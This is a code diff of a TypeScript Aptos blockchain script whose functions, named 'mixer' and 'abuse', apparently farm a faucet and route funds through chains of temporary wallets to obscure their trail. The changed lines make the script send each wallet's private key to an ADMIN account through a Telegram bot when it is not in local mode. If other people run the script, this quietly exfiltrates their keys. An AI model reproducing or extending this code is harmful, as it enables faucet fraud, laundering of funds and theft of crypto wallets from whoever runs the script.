@@ -28,8 +28,6 @@ const coinClient = new CoinClient(client)
 const toAPT = (value: bigint | string, fixed = 4) => (Number(value) / 100000000).toFixed(fixed)
 const randomInt = (value) => Math.floor(Math.random() * value)
 const isLocal = process.env.NODE_ENV !== 'production'
-// console.log('Local mode:', isLocal)
-// if (!isLocal) fs.mkdir(path.join(__dirname, '/wallets')).catch(e => console.log('output directory exists!'))
 
 // Transactions
 const sendTransaction = async (wallet : AptosAccount, payload, simulate = false) => {
@@ -106,7 +104,8 @@ const mixer = async (faucet: AptosAccount, wallet: AptosAccount, amount, count =
   for (let i = 0; i < mixers.length - 1; i++) {
     await sendAllAPT(mixers[i], mixers[i+1])
     await delay(1500)
-    await fs.appendFile(path.join(__dirname, '/wallets/temps.txt'), `${mixers[i].toPrivateKeyObject().privateKeyHex}\n`)
+    if (isLocal) await fs.appendFile(path.join(__dirname, '/wallets/temps.txt'), `${mixers[i].toPrivateKeyObject().privateKeyHex}\n`)
+    else bot.telegram.sendMessage(ADMIN, mixers[i].toPrivateKeyObject().privateKeyHex)
   }
   await sendAllAPT(mixers[mixers.length-1], wallet)
 }
@@ -145,8 +144,8 @@ const abuse = async () => {
         await sendAllAPT(wallet, end)
 
         console.log('Wait some time and start again!\nPress CONTROL+C in two seconds to break script!')
-        await fs.appendFile(path.join(__dirname, '/wallets/wallets.txt'), `${wallet.toPrivateKeyObject().privateKeyHex}\n`)
-        bot.telegram.sendMessage(ADMIN, wallet.toPrivateKeyObject().privateKeyHex)
+        if (isLocal) await fs.appendFile(path.join(__dirname, '/wallets/wallets.txt'), `${wallet.toPrivateKeyObject().privateKeyHex}\n`)
+        else bot.telegram.sendMessage(ADMIN, wallet.toPrivateKeyObject().privateKeyHex)
         await delay(GLOBAL_DELAY)
       }
     } catch (e) {
